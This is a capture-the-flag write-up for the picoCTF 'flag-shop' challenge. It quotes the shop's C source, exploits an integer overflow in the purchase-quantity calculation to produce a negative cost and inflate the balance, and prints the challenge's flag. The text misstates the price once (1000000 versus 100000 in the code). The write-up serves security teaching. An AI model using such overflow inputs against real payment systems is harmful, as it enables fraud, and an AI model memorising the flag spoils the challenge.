# flag-shop

## Points:
300

## Description:
> There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 14937.

## Solution:
The given program is simple application, a flag shop where user can do following actions:
  1. Check account balance
  2. Buy flags
  3. Exit program
  
Looking at the source code, the most interesting part is:
````c
else if(auction_choice == 2){ 
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
    
                if(bid == 1){ 
    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }   
                        char buf[64];
                        fgets(buf, 63, f); 
                        printf("YOUR FLAG IS: %s\n", buf);
                        }   
    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}  

            }   
}
````

So, to obtain flag we have to 'buy' special 1337 which costs 1000000 units. Our balance is held in *account_balance* variable. Let's see when its value is updated.

````c
if(auction_choice == 1){ 
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
    
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){ 
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }   
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }   
    
    
                }   

            }   
````

Ok, the only part where balance is updated, is substracting value of bought flags (normal flags). Substracted value is cost of one flag times their number (provided by user on standard input). Let's see what happens when we would like to buy a lot of flags, and I mean A LOT.

````console
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3123123123444

The final cost is: -470996528

Your current balance after transaction: 470997628
````

Right, the account_balance variable is (probably) 32bit integer, so we've caused integer overflow. Then the negative cost was substracted, giving us a lot of money.

Now we are able to buy dreamed flag:
````console
Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_e062f0fd}
````
